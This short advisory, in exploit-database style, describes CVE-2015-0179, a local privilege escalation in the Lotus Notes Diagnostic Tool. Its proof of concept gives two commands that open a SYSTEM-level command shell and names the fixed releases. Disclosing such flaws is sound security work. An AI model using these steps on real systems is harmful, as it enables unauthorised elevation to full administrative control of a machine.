# Tested on: Windows 7 Enterprise
# CVE: CVE-2015-0179

# Category: Local & Privilege Escalation Exploit


1. Description

Lotus Notes Diagnostic Tool (nsd.exe) runs under NT Authority/System rights.
This can be leveraged to run a program under the System context and elevate
local privileges.


2. Proof of Concept

First you need to execute nsd.exe under the monitor/CLI mode:

> nsd.exe -monitor

Next, after NSD finishes loading you can execute any program under the System context. In this example we will execute CMD.

nsd> LOAD CMD

You will see that cmd is opened as System now.

Also, NSD can be used to attach, kill processes or create memory dumps under the System context.


3. Solution:

This has been fixed on release 9.0.1 FP3 and 8.5.3 FP6.
